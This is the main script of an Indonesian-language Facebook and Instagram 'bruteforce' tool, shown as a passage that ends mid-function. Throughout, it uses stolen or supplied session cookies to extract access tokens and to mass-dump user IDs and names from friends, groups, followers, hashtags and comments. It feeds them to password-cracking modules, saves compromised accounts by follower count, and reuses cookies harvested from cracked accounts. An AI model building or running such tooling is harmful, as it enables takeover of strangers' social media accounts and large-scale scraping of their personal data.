#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- META 2024 -

Menu Premium
Code By Khamdihi Dev - Purbalingga
"""
xx, un = 0, []
Warning = '\n\n [!] Jangan Edit Apapun Agar Script Berjalan Dengan Semestinya, terima kasih'

try:
    import requests, platform, os, re, time, sys, pytz
    from bs4 import BeautifulSoup as bsp
    from concurrent.futures import ThreadPoolExecutor
    from Cryptodome.Cipher import AES, PKCS1_v1_5
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Random import get_random_bytes
except Exception:
    print('\n\t [ Menginstall Module Harap Tunggu ]\n')
    os.system('pip install -r modul.txt')

try:
    from dump import Group as Grp, Friends as MyFriends
    from method import main as Crm
    from method import ibrut_old as Bdt_old
    from method import ApiKey
except Exception as e:
    exit(Warning)

P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
M, K2 = K, K

if os.path.isfile('color.py') is True:
   import color
   H = color.khamdihi
else:print(f'{P}[{H}!{P}] Anda Menggunakan Theme Default');time.sleep(2)

class MAIN:

   bersih = lambda xyz, plt: os.system('clear' if plt.lower() == 'linux' else 'cls')
   userid = []
   pk_idg = []

   def __init__(self):
       try:self.bersih(platform.system())
       except:pass
       super(MAIN).__init__()

   def Me(self):
       print(r''' %s_____  _____  _____  _____
/  ___>/     \/  _  \|  _  \  %screate by
|___  ||  |--||  _  <|  |  |  %skhamdihi dev%s
<_____/\_____/\_____/|_____/  %ssimpel bruteforce %sv6.0%s

[%s*%s] Source : %shttps://github.com/khamdihi-dev/Prem.git%s
       '''%(P,P,H,P,P,H,P,H,P,H,P))

   def aset(self):
       if os.path.isfile('data/login.txt') is True:
          self.file = open('data/login.txt','r').read()
          self.stat = {'token':self.file.split('|')[0],'cokie':self.file.split('|')[1]}
       else:
          self.coki = {'cookie':input('[?] Masukan Cookie: ')}
          self.stat = self.login(self.coki)
       try:
          req = requests.get('https://graph.facebook.com/v18.0/me?access_token=%s'%(self.stat['token']), cookies = {'cookie':self.stat['cokie']}).json()
          uid = req['id']
          nma = req['name']
       except Exception as e:
          os.remove('data/login.txt')
          exit('\n[!] Login Erorr, Type: cookie invalid')
       open('data/login.txt','w').write(f'{self.stat["token"]}|{self.stat["cokie"]}')
       print(f'\n[*] Login sebagai : {nma}\n[*] ID : {uid}')
       return(self.stat)

   def login(self, cokie):
       try:
           req = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = cokie).text
           act = re.search('act=(\d+)',str(req)).group(1)
           res = requests.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&act=%s&breakdown_regrouping=1'%(act), cookies = cokie).text 
           xyz = re.search('window.__accessToken="(.*?)"', str(res)).group(1)
           return {'token':xyz,'cokie':cokie['cookie']}
       except Exception as e:
           exit('\n[!] Login Erorr, Type: cookie invalid')

   def Menu(self):
       self.item = self.aset()
       try:self.bersih(platform.system())
       except:pass
       print('[ Main Menu ]\n')
       print(f'[{H}1{P}] Dump Friends')
       print(f'[{H}2{P}] Dump Anggota Group')
       print(f'[{H}3{P}] Dump Pencarian Nama')
       print(f'[{H}4{P}] File Dump Anda')
       print(f'[{H}5{P}] Fitur Lainnya')
       print(f'[{H}6{P}] Instagram Brute ({H}Premium{P})\n')
       self.Main(self.item)

   def Main(self, items):
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']:self.teman(items['cokie'])
         elif x in ['02','2']:self.group(items['cokie'])
         elif x in ['03','3']:self.name(items['cokie'])
         elif x in ['04','4']:self.File()
         elif x in ['05','5']:self.more()
         elif x in ['06','6']:self.insta()
         else: continue

   def teman(self, cokie):
       print(f'\n{P}[{H}!{P}] Masukan ID/Username, Gunakan tanda Koma Sebagai Pemisah')
       data = input(f'[{H}?{P}] Masukan ID/Username : ').split(',')
       for user in data:
           try:
               req1 = requests.get(f'https://web.facebook.com/profile.php?id={user}&sk=friends_all',cookies={'cookie':cokie}).text
               data = self.Graphql(cokie,req1,True)
               head = self.Graphql(cokie,req1,False)
               uid1 = re.search('"props":{"collectionToken":"(.*?)"',str(req1)).group(1)
               data.update({'variables':'{"count":8,"cursor":"","scale":2,"search":null,"id":"'+uid1+'"}'})
               poke = MyFriends.MAIN().Friends(uid1, cokie, data, head)
           except:pass
       try:
           if poke is None:
              exit('\n[!] Teman Tidak Tersedia/Private')
           else:
              for xyz in poke:
                  self.userid.append(xyz)
       except:
           exit('\n[!] Teman Tidak Tersedia/Private')
       print('')
       Crm.MAIN().List(self.userid)

   def Graphql(self, cokie, resp, type):
       data = {'av': re.search('"actorID":"(\d+)"',str(resp)).group(1),'__user': re.search('"actorID":"(\d+)"',str(resp)).group(1),'__a': '1','__req': '','__hs': re.search('"haste_session":"(.*?)"',str(resp)).group(1),'dpr': '2','__ccg': re.search('"connectionClass":"(.*?)"',str(resp)).group(1),'__rev': re.search('{"rev":(.*?)}',str(resp)).group(1),'__hsi': re.search('"hsi":"(.*?)"',str(resp)).group(1),'__comet_req': re.search('__comet_req=(.*?)&',str(resp)).group(1),'fb_dtsg': re.search('"DTSGInitData":{"token":"(.*?)"',str(resp)).group(1),'jazoest': re.search('jazoest=(\d+)',str(resp)).group(1),'lsd': re.search('"LSD":{"token":"(.*?)"}',str(resp)).group(1),'__aaid': '0','__spin_r': re.search('"__spin_r":(\d+)',str(resp)).group(1),'__spin_b': 'trunk','__spin_t': re.search('"__spin_t":(\d+)',str(resp)).group(1),'fb_api_caller_class': 'RelayModern','fb_api_req_friendly_name': 'ProfileCometAppCollectionListRendererPaginationQuery','server_timestamps': 'true','doc_id': '6709724792472394'}
       head = {'Host': 'web.facebook.com','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','x-fb-friendly-name': 'ProfileCometAppCollectionListRendererPaginationQuery','x-fb-lsd': re.search('"LSD":{"token":"(.*?)"}',str(resp)).group(1),'content-type': 'application/x-www-form-urlencoded','x-asbd-id': '129477','accept': '*/*','origin': 'https://web.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
       return(data if type is True else head)

   def File(self):
       print(f'\n{P}[{H}!{P}] Masukan nama file atau lokasi (/sdcard/dump.txt)')
       file = input(f'[{H}?{P}] File dump : ')
       try:
           for xyc in open(file,'r').read().splitlines():
               try:
                   id, nama = xyc.split('|')
                   self.userid.append(xyc)
               except ValueError:
                   exit(f'\n{P}[{M}×{P}] Pemisahan salah.')
       except FileNotFoundError:
           exit(f'\n{P}[{M}×{P}] File tidak di temukan')
       Crm.MAIN().List(self.userid)

   def name(self, cokie):
       print(f'\n{P}[{H}!{P}] Masukan Nama Orang Bebas Contoh: diva,ladiva')
       rndm = input(f'{P}[{H}?{P}] Nama Orang : ').split(',')
       for xyx in rndm:
           _ = self.SearchName(f'https://mbasic.facebook.com/search/people/?q={xyx}&source=filter',cokie)
       print('')
       Crm.MAIN().List(self.userid)

   def group(self, cokie):
       print(f'\n{P}[{H}!{P}] Masukan ID Group Contoh: 5477429695615290')
       Grp_ID = input(f'[{H}?{P}] ID Group : ')
       Member = Grp.MAIN().Dumper(Grp_ID, cokie, '')
       if Member is None:exit('\n[!] Member Tidak Di Temukan.')
       else:
          for xyz in Member:
              self.userid.append(xyz)
       print('')
       Crm.MAIN().List(self.userid)

   def more(self):
       print('')
       print(f'{P}[{H}1{P}] Cek Hasil')
       print(f'[{H}2{P}] Ganti Tumbal')
       print(f'[{H}3{P}] Menu Utama')
       print(f'[{H}4{P}] Log, out\n')
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']:self.hasil()
         elif x in ['02','2']:os.remove('data/login.txt');self.Menu()
         elif x in ['03','3']:self.Menu()
         elif x in ['04','4']:os.remove('data/login.txt');exit('\n[!] Data Anda Sudah Di Hapus.')

   def hasil(self):
       print('')
       print(f'[{H}1{P}] Akun OK')
       print(f'[{H}2{P}] Akun CP')
       print(f'[{H}3{P}] Kembali\n')
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']:
            if os.path.isfile('data/OK.txt') is True:
               print('\n[ Akun success anda ]\n')
               jumlah = 0
               for a in open('data/OK.txt','r').read().splitlines():
                   jumlah +=1
                   print(f'\r {jumlah}. {a}')
               exit()
            else:
               exit('\n[!] Anda Belum Mendapatkan hasil success.')
         elif x in ['02','2']:
            if os.path.isfile('data/CP.txt') is True:
               print('\n[ Akun checkpoint anda ]\n')
               jumlah = 0
               for a in open('data/CP.txt','r').read().splitlines():
                   jumlah +=1
                   print(f'\r {jumlah}. {a}')
               exit()
            else:
               exit('\n[!] Anda Belum Mendapatkan hasil checkpoint.')
         elif x in ['03','3']:self.Menu()
         else:continue

   def find_res(self, meki=[]):
       try:
           self.file = os.listdir('data')
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
               else: print('%s[%s+%s] %s'%(P,H,P,self.su))
           self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
       except Exception as e:exit(e)
       for a in open(f'data/{self.name}','r').read().splitlines():
           xyz = re.findall('ds_user_id=(.*)',str(a))
           if len(xyz) == 0:continue
           else:
                if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
       if len(meki) == 0:
          exit(f'\n{P}[{M}!{P}] Tidak Bisa menemukan cokie!')
       else:
          for memek in meki:
              try:
                  print(f'\n{P}[{H}!{P}] Mencoba: {H}{memek}')
                  xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
                  uid = re.search('ds_user_id=(\d+)', str(memek)).group(1)
                  req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':memek}).json()['user']['full_name']
                  open('data/IG-login.txt','w').write(f'{memek}')
                  print(f'\n{P}[{H}!{P}] Login sebagai : {req}')
                  time.sleep(2)
                  try:self.bersih(platform.system())
                  except:pass
                  self.insta()
              except Exception as e:
                  print(f'\n{P}[{K}!{P}] Expired: {K}{memek}')

   def aset_ig(self):
       try:self.bersih(platform.system())
       except:pass
       if os.path.isfile('data/IG-login.txt') is True:
           self.coki = {'cookie':open('data/IG-login.txt','r').read()}
       else:
           self.momo = {'cookie':input('[ Login instagram ]\n\n[?] Masukan cookie : ')}
           if self.momo['cookie'] == 'res':
              self.coki = {'cookie':self.find_res()}
           else:self.coki = self.momo
       try:
           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
           cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=xyz,  cookies=self.coki).json()
           uid = re.search('ds_user_id=(\d+)', str(self.coki['cookie'])).group(1)
           req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies=self.coki).json()['user']
           open('data/IG-login.txt','w').write(f'{self.coki["cookie"]}')
       except:
           os.system('rm -rf data/IG-login.txt')
           print('\n[!] Invalid cookie');self.aset_ig()
       try:self.bersih(platform.system())
       except:pass
       return self.coki, req['full_name'], req['follower_count']

   def insta(self):
       try:self.bersih(platform.system())
       except:pass
       self.aset,self.nama,self.fol = self.aset_ig()
       self.Me()
       print(f' {P}• {H}Users Information{P}\n')
       ApiKey.UserKey().konfirkeys()
       print(f'''
[{H}>{P}] Nama      : {H}{self.nama}{P}
[{H}>{P}] Followers : {H}{self.fol}

{P}[{H}1{P}] Dump Followers    [{H}5{P}] Dump Explore
{P}[{H}2{P}] Dump Following    [{H}6{P}] Dump Komentar
{P}[{H}3{P}] Chek Checkpoin    [{H}7{P}] Dump Unlimited
{P}[{H}4{P}] Chek Results      [{H}8{P}] Dump Hastag
{P}[{H}U{P}] Save Hasil {H}sdcard{P} [{H}9{P}] Log, Out & Theme\n''')
       self.chs(self.aset)

   def chs(self, assets):
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']:self.dumps(assets, True)
         elif x in ['02','2']:self.dumps(assets, False)
         elif x in ['03','3']:self.Ulang()
         elif x in ['04','4']:self.igrst()
         elif x in ['05','5']:
              print(f'\n[{H}!{P}] Dump Memakan Waktu Lebih Lama!')
              self.Explore(assets,1)
              Bdt.MAIN().List(self.pk_idg)
              exit(1)
         elif x in ['06','6']:self.komentar(assets)
         elif x in ['07','7']:self.Unli(assets)
         elif x in ['08','8']:self.hash(assets)
         elif x in ['u','U' ]:self.save_sd()
         elif x in ['09','9']:self.theme()
         else: continue

   def theme(self):
       print(f'\n{P}[{H}1{P}] Ubah Tema Warna Pada Menu Ini')
       print(f'{P}[{H}2{P}] Log, Out\n')
       x = input(f'[{H}?{P}] Pilih : ')
       if x in ['01','1']:
          TP = '\x1b[1;97m'
          TM = '\x1b[1;91m'
          TH = '\x1b[1;92m'
          TK = '\x1b[1;93m'
          TB = '\x1b[1;94m'
          TU = '\x1b[1;95m'
          TO = '\x1b[1;96m'
          TN = '\x1b[0m'
          print(f'''
 [ {H}MENU {P}]          [ {H}Hasil Warna {P}]

[{H}1{P}] Hijau           {TH}Khamdihi Dev{TN}
[{H}2{P}] Biru Muda       {TO}Khamdihi Dev{TN}
[{H}3{P}] Putih           {TP}Khamdihi Dev{TN}
[{H}4{P}] Merah           {TM}Khamdihi Dev{TN}
[{H}5{P}] Ungu            {TU}Khamdihi Dev{TN}
[{H}6{P}] Polos           {TN}Khamdihi Dev{TN}
[{H}7{P}] Kuning          {TK}Khamdihi Dev{TN}\n  ''')
          while True:
            color = input(f'[{H}?{P}] Pilih : ')
            if color in ['1','01']:open('color.py','w').write("khamdihi = '\x1b[1;92m'")
            elif color in ['2','02']:open('color.py','w').write("khamdihi = '\x1b[1;96m'")
            elif color in ['3','03']:open('color.py','w').write("khamdihi = '\x1b[1;97m'")
            elif color in ['4','04']:open('color.py','w').write("khamdihi = '\x1b[1;91m'")
            elif color in ['5','05']:open('color.py','w').write("khamdihi = '\x1b[1;95m'")
            elif color in ['6','06']:open('color.py','w').write("khamdihi = '\x1b[0m'")
            else:open('color.py','w').write("khamdihi = '\x1b[1;93m'")
            print(f'\n{P}[{H}✓{P}] Berhasil Mengubah Theme');time.sleep(2)
            os.system(f'python {sys.argv[0]}')

       else:os.system('rm -rf data/IG-login.txt');exit()

   def save_sd(self, col = []):
       try:
           self.file = os.listdir('data')
           print('\n [ Pilih File Anda ]\n')
           for self.su in self.file:
               self.xy = self.su.split('Instagram')
               if len(self.xy) <2:pass
               else:
                    col.append(self.su)
                    print('%s[%s+%s] %s'%(P,H,P,self.su))
           print(f'\n{P}[{H}!{P}] Ketik {H}all{P} Untuk Save Semua File Di atas')
           self.name = input('[%s!%s] Masukan nama file : '%(H,P))
           print(f'\n[{M}!{P}] Pastikan Anda Sudah Menginzinkan Termux Mengakses /sdcard')
           if self.name in ('all','All'):
              for self.xyz in col:
                  os.system(f'cp data/{self.xyz} /sdcard')
              print(f'[{H}+{P}] Succes save all file to /sdcard')
           else:
              os.system(f'cp data/{self.name} /sdcard')
              print(f'[{H}+{P}] Succes save {self.name} to /sdcard')
       except Exception as e:exit(e)

   def hash(self, cokie):
       print(f'\n[{H}?{P}] Masukan Nama Hastag Example: jokowi,indonesia')
       hastag = input(f'[{H}?{P}] Hastag : ').split(',')
       for self.hs in hastag:
           self.Hastag(self.hs, cokie, '')
       self.ToolsType()

   def Hastag(self, hash, cokie, max):
       global xx
       try:
            self.hdz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3','cookie':cokie['cookie']}
            self.req = requests.get(f'https://www.instagram.com/api/v1/tags/web_info/?tag_name={hash}&max_id={max}', headers=self.hdz).json()['data']['top']
            for self.usr in self.req['sections']:
                try:
                    self.usx = re.findall("'username': '(.*?)'", str(self.usr))[0]
                    self.ful = re.findall("'full_name': '(.*?)'",str(self.usr))[0]
                    self.xyu = f'{self.usx}|{self.ful}'
                    if self.xyu not in self.pk_idg:
                       xx +=1
                       self.pk_idg.append(self.xyu)
                except:pass
            print(f'\r[+] Berhasil dump {xx}',end=' ')
            self.hdz.update({'x-csrftoken':re.search('csrftoken=(.*?);',str(cokie['cookie'])).group(1)})
            self.next = requests.post(f'https://i.instagram.com/api/v1/tags/{hash}/sections/', headers=self.hdz, cookies=cokie).json()
            for self.x in self.next['sections']:
                self.ce = re.search("'next_max_id': '(.*?)'", str(self.next)).group(1)
                self.usx = re.findall("'username': '(.*?)'", str(self.x))[0]
                self.ful = re.findall("'full_name': '(.*?)'",str(self.x))[0]
                self.xyu = f'{self.usx}|{self.ful}'
                if self.xyu not in self.pk_idg:
                   xx +=1
                   self.pk_idg.append(self.xyu)
            self.Hastag(hash, cokie, self.ce)
       except:pass

   def komentar(self, cokie, dav=[]):
       print(f'\n[{H}?{P}] Masukan link postingan atau reels. pisahkan dengan koma')
       link = input(f'[{H}?{P}] Link post : ').split(',')
       try:
           for ling in link:
               self.r = requests.get(ling, cookies=cokie).text
               self.o = re.search('"media_id":"(\d+)"', str(self.r)).group(1)
               dav.append(self.o)
           for self.x in dav:
               self.dump_komen(cokie, self.x, '')
       except:pass
       self.ToolsType()

   def dump_komen(self, cokie, uid, min):
       global xx
       try:
            self.r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
            for self.i in self.r['comments']:
                self.a = self.i['user']['username'] +'|'+ self.i['user']['full_name']
                if self.a not in self.pk_idg:
                   self.pk_idg.append(self.a)
                   xx +=1
                   print(f'\r[+] Berhasil dump {xx}',end=' ')
            if 'next_min_id' in str(self.r):
                self.dump_komen(cokie, uid, self.r['next_min_id'])
       except:pass

   def Unli(self, cokie):
       if 'csrftoken' not in str(cokie['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cokie).json()
              self.token = self.memek['config']['csrf_token']
              cokie['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       print(f'\n[{H}?{P}] Masukan username, Cukup Ambil 20-50 ID!')
       self.user = input(f'[{H}?{P}] Username : ')
       try:
           req = requests.get(f'https://www.instagram.com/{self.user}/', cookies = cokie).text
           uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
           print(f'\n[{H}!{P}] Mengambil ID klik CTRL + C Untuk Stop')
           self.Exekusi(uid, cokie, '', True,True)
       except:pass
       if len(un) > 0:
          print(f'\n\n[{H}!{P}] Di sini Matikan Data Untuk Stop!')
          for self.momok in un:
              self.Graphql(True, self.momok, cokie['cookie'], '')
       else:exit('\n[!] Ganti Username/Tumbal!')
       self.ToolsType()

   def igrst(self):
       print('')
       print(f'[{H}1{P}] Akun OK')
       print(f'[{H}2{P}] Akun CP')
       print(f'[{H}3{P}] Kembali\n')
       while True:
         x = input(f'[{H}?{P}] Pilih : ')
         if x in   ['01','1']:
            print(f'\n[{H}1{P}] Cek Akun Followers Di Bawah 100')
            print(f'[{H}2{P}] Cek Akun Followers DI Atas 100')
            print(f'[{H}3{P}] Pilih Nama File Untuk Cek Result\n')
            while True:
              y = input(f'[{H}?{P}] Pilih : ')
              if y  in ['01','1']:
                 if os.path.isfile('data/OK-Instagram_dibawah_100.txt') is True:
                    print('\n[ Akun success followers di bawah 100 ]\n')
                    for a in open('data/OK-Instagram_dibawah_100.txt','r').read().splitlines():
                        print(f'\r {P}{a}')
                    exit()
                 else:
                    exit('\n[!] Anda tidak memiliki result dengan followers di bawah 100')
              elif y in ['02','2']:
                 if os.path.isfile('data/OK-Instagram_diatas_100.txt') is True:
                    print('\n[ Akun success followers di atas 100 ]\n')
                    for a in open('data/OK-Instagram_diatas_100.txt','r').read().splitlines():
                        print(f'\r {P}{a}')
                    exit()
                 else:
                    exit('\n[!] Anda tidak memiliki result dengan followers di atas 100')
              elif y in ['03','3']:
                 try:
                     self.file = os.listdir('data')
                     print('\n [ Pilih File Anda ]\n')
                     for self.su in self.file:
                        if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
                        else: print('%s[%s+%s] %s'%(P,H,P,self.su))
                     self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
                 except Exception as e:exit(e)
                 for a in open(f'data/{self.name}','r').read().splitlines():
                     print(' %s'%(a))
                 exit()
         elif x in ['02','2']:
            print(f'\n[{H}1{P}] Cek Akun Followers Di Bawah 100')
            print(f'[{H}2{P}] Cek Akun Followers DI Atas 100')
            print(f'[{H}3{P}] Pilih Nama File Untuk Cek Hasil\n')
            while True:
              y = input(f'[{H}?{P}] Pilih : ')
              if y  in ['01','1']:
                 if os.path.isfile('data/CP-Instagram_dibawah_100.txt') is True:
                    print('\n[ Akun chek followers di bawah 100 ]\n')
                    for a in open('data/CP-Instagram_dibawah_100.txt','r').read().splitlines():
                        print(f'\r {P}{a}')
                    exit()
                 else:
                    exit('\n[!] Anda tidak memiliki result dengan followers di bawah 100')
              elif y in ['02','2']:
                 if os.path.isfile('data/CP-Instagram_diatas_100.txt') is True:
                    print('\n[ Akun check followers di atas 100 ]\n')
                    for a in open('data/CP-Instagram_diatas_100.txt','r').read().splitlines():
                        print(f'\r {P}{a}')
                    exit()
                 else:
                    exit('\n[!] Anda tidak memiliki result dengan followers di atas 100')
              elif y in ['03','3']:
                 try:
                     self.file = os.listdir('data')
                     print('\n [ Pilih File Anda ]\n')
                     for self.su in self.file:
                        if 'ok' not in self.su.lower() or 'cp' not in self.su.lower():pass
                        else: print('%s[%s+%s] %s'%(P,H,P,self.su))
                     self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
                 except Exception as e:exit(e)
                 for a in open(f'data/{self.name}','r').read().splitlines():
                     print(' %s'%(a))
                 exit()

         elif x in ['03','3']:self.insta()

   def Explore(self, cookie, max):
       global xx
       try:
           self.req = requests.get(f'https://www.instagram.com/api/v1/discover/web/explore_grid/?include_fixed_destinations=true&is_nonpersonalized_explore=false&is_prefetch=false&max_id={max}&module=explore_popular&omit_cover_media=false', cookies = cookie).json()
           for self.asu in self.req['sectional_items']:
               try:
                    self.item = self.asu['layout_content']['medias']
                    for self.rrc in self.item:
                        self.cap = self.rrc['media']['caption']['user']
                        self.usd = str(self.cap['username']) +'|'+ str(self.cap['full_name'])
                        if self.usd not in self.pk_idg:
                           xx +=1
                           self.pk_idg.append(self.usd)
                           print(f'\r[+] Berhasil dump {xx}',end=' ')
                    if 'next_max_id' in str(self.req):
                        self.next = self.req['next_max_id']
                        self.Explore(cookie, self.next)
               except:pass
       except:pass
       return 1

   def Ulang(self):
       try:
          dirs = os.listdir('data')
          if len(dirs) == 0:exit(f'\n{P}[{M}!{P}] File Tidak Ada')
          print('')
          for angka,asu in enumerate(dirs, start=1):
              if 'CP' not in str(asu):pass
              else:print(f' {P}[{H}*{P}] {asu}')
          print(f'\n[{H}!{P}] Masukan Nama file. Jangan Angkanya')
          file = input(f'[{H}?{P}] Nama file : ')
          for rest in open(f'data/{file}','r').read().splitlines():
              uid, pas = rest.split('|')[0], rest.split('|')[1]
              self.pk_idg.append(f'{uid}|{pas}')
              print(f'\r[+] Berhasil dump {len(self.pk_idg)}',end=' ')
       except (FileNotFoundError,ValueError):
          exit('\n[!] File Tidak Ada Atau Pemisahan Salah.')
       self.ToolsType()

   def dumps(self, cintil, typess, xyz = []):
       if 'csrftoken' not in str(cintil['cookie']):
          try:
              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
              self.token = self.memek['config']['csrf_token']
              cintil['cookie'] +=';csrftoken=%s;'%(self.token)
          except Exception as e:
              os.system('rm -rf data/IG-login.txt')
              exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
       print(f'\n[{H}?{P}] Masukan username akun instagram. Pisahkan Dengan Koma')
       users = input(f'[{H}?{P}] Username : ').split(',')
       try:
           for self.y in users:
               req = requests.get(f'https://www.instagram.com/{self.y}/', cookies = cintil).text
               uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
               if uid not in xyz:xyz.append(uid)
       except:pass
       try:
           mode = 'followers' if typess is True else 'following'
           for kintil in xyz:
               if typess is True:
                  self.Graphql(True, kintil, cintil['cookie'], '')
               else:
                  self.Graphql(False, kintil, cintil['cookie'], '')
       except:pass
       self.ToolsType()

   def Exekusi(self, uid, cokie, next, mode,unli=None):
       global xx
       headers = {
          'Host': 'www.instagram.com',
          'sec-ch-ua': 'Not_A',
          'x-ig-www-claim': 'hmac.AR3wIOBZNgwIzZCJb_cblllbPVaQIQ3s0Fnc_ldkrQdQoabq',
          'sec-ch-ua-platform-version': '8.1.0',
          'x-requested-with': 'XMLHttpRequest',
          'dpr': '2',
          'sec-ch-ua-full-version-list': 'Not_A',
          'sec-ch-prefers-color-scheme': 'light',
          'x-csrftoken': re.search('csrftoken=(.*?);',str(cokie['cookie'])).group(1),
          'sec-ch-ua-platform': 'Android',
          'x-ig-app-id': '1217981644879628',
          'sec-ch-ua-model': 'CPH1803',
          'sec-ch-ua-mobile': '?1',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'viewport-width': '360',
          'accept': '*/*',
          'x-asbd-id': '129477',
          'sec-fetch-site': 'same-origin',
          'sec-fetch-mode': 'cors',
          'sec-fetch-dest': 'empty',
          'referer': 'https://www.instagram.com',
          'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
       }
       params = {
          'count': '12',
          'search_surface': 'follow_list_page',
          'max_id':next
       }
       if mode == 'following':
           response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/following/?count=12&max_id={next}', cookies=cokie,headers=headers).json()
       else:
           response = requests.get(f'https://www.instagram.com/api/v1/friendships/{uid}/followers/',params=params,cookies=cokie,headers=headers).json()
       for self.mmk in response['users']:
           xx+=1
           self.xy = self.mmk['username'] + '|' + self.mmk['full_name']
           if self.xy not in self.pk_idg:
              if unli is None:
                 self.pk_idg.append(self.xy)
              else:
                 self.zc = self.mmk['pk']
                 un.append(self.zc)
              print(f'\r[+] Berhasil dump {xx}',end=' ')
       if 'next_max_id' in str(response):
           self.Exekusi(uid, cokie, response['next_max_id'], mode)

   def Graphql(self, typess, userid, cokie,after):
       global xx
       self.api = "https://www.instagram.com/graphql/query/"
       self.csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
       self.mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(self.csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(self.csr)
       try:
           self.ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
           self.req = requests.get(self.api, params=self.mek, headers=self.ptk).json()
           if 'require_login' in self.req:
               if len(self.pk_idg) > 0:
                  pass
               else:
                  exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
           self.khm = 'edge_followed_by' if typess is True else 'edge_follow'
           for self.xyz in self.req['data']['user'][self.khm]['edges']:
               self.xy = self.xyz['node']['username'] + '|' + self.xyz['node']['full_name']
               if self.xy not in self.pk_idg:
                  xx +=1
                  self.pk_idg.append(self.xy)
                  print(f'\r{P}[{H}+{P}] Berhasil dump {H}{xx} {P}id {K}{userid}',end=' ')
           self.end = self.req['data']['user'][self.khm]['page_info']['has_next_page']
           if self.end is True:
               self.after = self.req['data']['user'][self.khm]['page_info']['end_cursor']
               self.Graphql(typess, userid, cokie, self.after)
           else:pass
       except:pass

   def SearchName(self, url,coki):
       try:
           array = self.userid
           link = bsp(requests.get(url,cookies={'cookie':coki}).text,'html.parser')
           for i in link.find_all("a",href=True):
               print(f'[+] Berhasil dump {len(self.userid)}',end='\r');sys.stdout.flush()
               if '/profile.php?' in str(i['href']):
                  try:
                      pk, nm = re.search('id=(\d+)',str(i['href'])).group(1), re.search('<img alt="(.*?), profile picture"', str(i)).group(1)
                      xyz = '%s|%s'%(pk,nm)
                      if pk not in array:
                         if nm == '':pass
                         else:array.append(xyz)
                  except: continue
               else:
                  if 'profile picture"' in i or '<img alt=' in str(i):
                     try:
                         pk,nm = re.search('/(.*?)?eav',i['href']).group(1).split('?')[0],re.search('<img alt="(.*?), profile picture"', str(i)).group(1)
                         xyz = '%s|%s'%(pk,nm)
                         if xyz not in array:array.append(xyz)
                     except:pass
           for r in link.find_all("a",href=True):
